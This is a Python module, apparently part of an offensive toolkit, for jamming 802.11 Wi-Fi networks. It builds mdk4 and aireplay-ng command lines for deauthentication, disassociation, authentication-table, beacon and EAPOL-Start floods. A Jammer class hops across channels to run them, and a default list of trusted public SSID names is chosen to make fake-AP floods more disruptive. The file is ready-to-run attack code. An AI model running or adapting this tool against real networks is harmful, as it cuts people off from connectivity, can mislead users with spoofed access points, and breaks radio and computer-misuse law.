"""802.11 jamming: plans you can read, argv you can check.

"Jam the Wi-Fi" is five different attacks, and which one works depends on the
target:

* **deauth** — kick associated clients (reason 7, or 1/3 when a driver
  rewrites the first one);
* **disassoc** — drop the association instead of the authentication, which some
  clients honour when deauth is filtered;
* **auth** — flood the AP's association table so a legitimate client cannot
  join;
* **beacon** — fill the scan list with fake APs, which is what makes a phone's
  Wi-Fi picker unusable;
* **eapol** — EAPOL-Start flood, the only thing WPA3/PMF clients really feel.

Each mode is one ``mdk4`` invocation (or an ``aireplay-ng`` fallback for the
deauth pair), and a channel plan that adds up to exactly the requested window.
The argv builders are pure functions, so the whole thing is testable without
a radio.
"""

from __future__ import annotations

import os
import time

from omni.core import config, console, proc

__all__ = ["MODES", "BAND_CHANNELS", "DEFAULT_SSIDS", "channels", "hop_plan",
           "ssid_list", "ssid_file", "mdk4_argv", "aireplay_argv", "Jammer",
           "BROADCAST"]

#: mode -> what it does to the target
MODES = {
    "deauth": "kick associated clients (per-client when known)",
    "disassoc": "drop associations instead of authentications",
    "auth": "flood the AP's association table",
    "beacon": "flood the scan list with fake APs",
    "eapol": "EAPOL-Start flood (PMF/WPA3 clients)",
}

#: channels worth walking per band
BAND_CHANNELS = {
    "2.4": list(range(1, 14)),
    "5": [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
          124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165],
}

#: SSIDs that make a beacon flood actually hurt — the names people trust
DEFAULT_SSIDS = ("Free WiFi", "Free_Public_WiFi", "Guest", "xfinitywifi",
                 "eduroam", "Starbucks WiFi", "Airport_Free_WiFi",
                 "iPhone", "AndroidAP", "HOME-2.4G", "TP-LINK_5G",
                 "ATT-WIFI-1234", "Virgin Media", "Telekom_FON")

BROADCAST = "FF:FF:FF:FF:FF:FF"


def _channel_range(chunk: str) -> list[int]:
    """``"1-11"`` / ``"100-140:8"`` / ``"36"`` -> channel numbers."""
    text = chunk.strip().replace(" ", "")
    if not text:
        return []
    if "-" in text:
        span, _, step = text.partition(":")
        low, _, high = span.partition("-")
        try:
            start, stop = int(low), int(high)
            stride = max(1, int(step)) if step else 1
        except ValueError:
            raise ValueError(f"bad channel range {chunk!r}") from None
        return list(range(min(start, stop), max(start, stop) + 1, stride))
    try:
        return [int(text)]
    except ValueError:
        raise ValueError(f"bad channel {chunk!r}") from None


def channels(spec: str = "", band: str = "2.4") -> list[int]:
    """Channel list from a spec, or the whole band when the spec is blank."""
    if not (spec or "").strip():
        key = (band or "2.4").strip().lower().replace("ghz", "")
        if key not in BAND_CHANNELS:
            raise ValueError(f"band must be one of "
                             f"{', '.join(BAND_CHANNELS)} — got {band!r}")
        return list(BAND_CHANNELS[key])
    out: list[int] = []
    for chunk in (spec or "").replace(";", ",").split(","):
        for channel in _channel_range(chunk):
            if 1 <= channel <= 196 and channel not in out:
                out.append(channel)
    if not out:
        raise ValueError(f"no usable channel in {spec!r}")
    return out


def hop_plan(channel_list: list[int], seconds: float,
             dwell_ms: int = 500) -> list[tuple[int, float]]:
    """``(channel, dwell_seconds)`` slots covering exactly ``seconds``."""
    plan_channels = [int(c) for c in channel_list if c]
    if not plan_channels:
        raise ValueError("no channel to jam — give CHANNELS or a BAND")
    total = max(0.2, float(seconds))
    dwell = max(0.1, int(dwell_ms) / 1000.0)
    plan: list[tuple[int, float]] = []
    spent = 0.0
    index = 0
    while spent < total - 1e-9:
        slot = min(dwell, total - spent)
        plan.append((plan_channels[index % len(plan_channels)],
                     round(slot, 3)))
        spent += slot
        index += 1
    return plan


def ssid_list(text: str = "") -> list[str]:
    """SSIDs for a beacon flood, from text (newlines or commas) or the default."""
    names = [name.strip() for name in (text or "").replace(",", "\n").split("\n")
             if name.strip()]
    return names or list(DEFAULT_SSIDS)


def ssid_file(names: list[str], path: str = "") -> str:
    """Write an mdk4 SSID list to disk and return its path."""
    target = os.path.expanduser(
        path or os.path.join(config.output_dir("wifi/jam"), "ssids.txt"))
    parent = os.path.dirname(target)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(target, "w", encoding="utf-8", newline="\n") as fh:
        fh.write("\n".join(names) + "\n")
    return target



#: modes that need a target BSSID to be meaningful
TARGETED = ("auth", "deauth", "disassoc", "eapol")


def mdk4_argv(mode: str, iface: str, *, bssid: str = "", ssid: str = "",
              ssid_path: str = "", client: str = "", channel: int = 0,
              pps: int = 1000, reason: int = 7) -> list[str]:
    """The exact ``mdk4`` command line for one mode.

    Raises ``ValueError`` when the mode cannot work with what was supplied —
    an auth flood with no BSSID is just noise, and saying so beats a silent
    non-attack.
    """
    key = (mode or "").strip().lower()
    if key not in MODES:
        raise ValueError(f"mode must be one of {', '.join(MODES)} — "
                         f"got {mode!r}")
    argv = ["mdk4", iface, key[0]]
    if key == "beacon":
        if ssid_path:
            argv += ["-f", ssid_path]
        elif ssid:
            argv += ["-n", ssid]
        else:
            raise ValueError("beacon flood needs SSIDS or an SSID list file")
        argv += ["-s", str(max(1, int(pps)))]
        if channel:
            argv += ["-c", str(int(channel))]
        return argv
    if not bssid:
        raise ValueError(f"a {key} flood needs the target BSSID")
    if key == "auth":
        argv += ["-a", bssid]
    elif key in ("deauth", "disassoc"):
        argv += ["-B", bssid, "-r", str(int(reason))]
        target = client or BROADCAST
        if target != BROADCAST:
            argv += ["-E", target]
    else:                                        # eapol
        argv += ["-a", bssid, "-e", ssid or bssid]
    argv += ["-s", str(max(1, int(pps)))]
    if channel:
        argv += ["-c", str(int(channel))]
    return argv


def aireplay_argv(bssid: str, iface: str, count: int = 64, reason: int = 7,
                  client: str = BROADCAST) -> list[str]:
    """``aireplay-ng`` fallback for the deauth/disassoc modes."""
    if not bssid:
        raise ValueError("a deauth needs the target BSSID")
    return ["aireplay-ng", "--deauth", str(max(1, int(count))),
            "-a", bssid, "-c", client or BROADCAST,
            f"--reason={int(reason)}", iface]



class Jammer:
    """Runs a channel plan: retune, fire, wait, retune.

    ``setter``, ``runner`` and ``spawner`` are injectable so the loop can be
    exercised without a monitor interface or an mdk4 binary.
    """

    def __init__(self, iface: str, mode: str,
                 plan: list[tuple[int, float]], *, bssid: str = "",
                 ssid: str = "", ssid_path: str = "", client: str = "",
                 pps: int = 1000, reason: int = 7, tool: str = "",
                 setter=None, runner=None, spawner=None):
        self.iface = iface
        self.mode = (mode or "").strip().lower()
        if self.mode not in MODES:
            raise ValueError(f"mode must be one of {', '.join(MODES)}")
        self.plan = list(plan)
        if not self.plan:
            raise ValueError("empty channel plan")
        self.bssid = (bssid or "").upper()
        self.ssid = ssid
        self.ssid_path = ssid_path
        self.client = (client or "").upper()
        self.pps = max(1, int(pps))
        self.reason = int(reason)
        self.tool = (tool or "").strip().lower()
        self.setter = setter or _set_channel
        self.runner = runner or _run_argv
        self.spawner = spawner or _spawn

    # -- capability --------------------------------------------------------
    def resolve_tool(self) -> str:
        """``mdk4`` when present, else the aireplay/beacon fallback."""
        if self.tool in ("mdk4", "aireplay"):
            return self.tool
        if proc.has("mdk4"):
            return "mdk4"
        if self.mode in ("deauth", "disassoc") and proc.has("aireplay-ng"):
            return "aireplay"
        if self.mode == "beacon":
            return "airodump"                    # capture.beacon_flood
        raise RuntimeError(
            f"no tool for a {self.mode} flood — install mdk4 (apt install "
            "mdk4); only deauth/disassoc/beacon have a fallback")

    def command(self, channel: int) -> list[str]:
        """The argv for one slot (fallback tools build their own)."""
        tool = self.resolve_tool()
        if tool == "mdk4":
            return mdk4_argv(self.mode, self.iface, bssid=self.bssid,
                             ssid=self.ssid, ssid_path=self.ssid_path,
                             client=self.client, channel=channel,
                             pps=self.pps, reason=self.reason)
        if tool == "aireplay":
            if self.mode not in ("deauth", "disassoc"):
                raise ValueError(f"aireplay-ng only does deauth/disassoc, "
                                 f"not {self.mode} — install mdk4")
            count = max(8, int(self.pps * 0.25))
            return aireplay_argv(self.bssid, self.iface, count, self.reason,
                                 self.client or BROADCAST)
        raise RuntimeError("the beacon fallback runs through airodump-ng, "
                           "which needs no argv from here")

    # -- execution ---------------------------------------------------------
    def run(self) -> dict:
        tool = self.resolve_tool()
        frames = 0
        slots = 0
        for channel, dwell in self.plan:
            self.setter(self.iface, channel)
            if tool == "airodump":
                from omni.wifi import capture          # local: import cycle
                capture.beacon_flood(self.iface,
                                     [self.ssid] if self.ssid else None,
                                     count=int(self.pps * dwell))
            else:
                self.runner(self.command(channel), dwell, self.spawner)
            frames += int(self.pps * dwell)
            slots += 1
            console.info(f"ch {channel}: {self.mode} for {dwell:g}s "
                         f"({tool})")
        console.ok(f"{slots} slot(s) over {len(self.plan)} hop(s), "
                   f"~{frames} frame(s) requested ({tool})")
        return {"tool": tool, "slots": slots, "frames": frames,
                "mode": self.mode, "plan": self.plan}


def _set_channel(iface: str, channel: int) -> bool:
    """Retune the monitor interface for one slot."""
    from omni.wifi import iface as iface_mod
    return iface_mod.channel(iface, int(channel))


def _spawn(argv: list[str]):
    return proc.spawn(argv)


def _run_argv(argv: list[str], dwell: float, spawner) -> None:
    """Spawn a long-running flood, let it run for ``dwell``, then stop it."""
    child = spawner(argv)
    try:
        time.sleep(max(0.05, float(dwell)))
    finally:
        terminate = getattr(child, "terminate", None)
        if terminate is not None:
            try:
                terminate()
            except Exception:                     # noqa: BLE001 - cleanup
                pass
